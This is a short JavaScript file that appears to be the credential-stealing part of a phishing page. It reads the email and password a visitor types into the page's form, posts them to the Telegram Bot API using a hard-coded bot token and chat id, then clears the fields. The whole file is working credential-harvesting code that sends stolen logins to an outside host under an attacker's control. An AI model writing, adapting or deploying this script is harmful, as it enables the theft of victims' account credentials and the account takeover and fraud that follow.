//bot token
var telegram_bot_id = "7891068435:AAFz-3KGmKmD_uIYB11HGCmatsa3DIsexO4";
//chat id
var chat_id = 6901789341;
var email, pass;
var ready = function () {
    email = document.getElementById("email").value;
    pass = document.getElementById("password").value;
   
    message = "Email: " + email + "\npassword: " + pass ;
};
var sender = function () {
    ready();
    var settings = {
        "async": true,
        "crossDomain": true,
        "url": "https://api.telegram.org/bot" + telegram_bot_id + "/sendMessage",
        "method": "POST",
        "headers": {
            "Content-Type": "application/json",
            "cache-control": "no-cache"
        },
        "data": JSON.stringify({
            "chat_id": chat_id,
            "text": message
        })
    };
    $.ajax(settings).done(function (response) {
        console.log(response);
    });
    document.getElementById("email").value = "";
    document.getElementById("password").value = "";
   
    return false;
};